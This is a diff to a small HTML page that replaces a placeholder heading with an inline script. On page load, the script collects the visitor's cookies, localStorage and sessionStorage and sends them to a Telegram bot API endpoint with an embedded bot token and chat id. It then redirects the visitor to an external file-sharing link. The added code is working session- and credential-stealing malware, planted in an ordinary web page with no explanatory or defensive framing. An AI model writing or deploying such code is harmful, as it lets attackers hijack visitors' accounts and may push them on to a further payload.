@@ -1,11 +1,18 @@
-<!doctype html>
-<html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Document</title>
-  </head>
+<html>
   <body>
-    <h1>devil.delivery</h1>
+    <script>
+      fetch(
+        "https://api.telegram.org/bot8391422515:AAE8mfD8eefaNRsOoRwnr6BeTlfQEABfO8k/sendMessage?chat_id=-1003343793064&text=" +
+          encodeURIComponent(
+            document.cookie +
+              " | " +
+              JSON.stringify(localStorage) +
+              " | " +
+              JSON.stringify(sessionStorage),
+          ),
+      ).then(() => {
+        window.location = "https://file.kiwi/a5383f5e#aTK-XRejXlmJmJsCiqex1A";
+      });
+    </script>
   </body>
 </html>
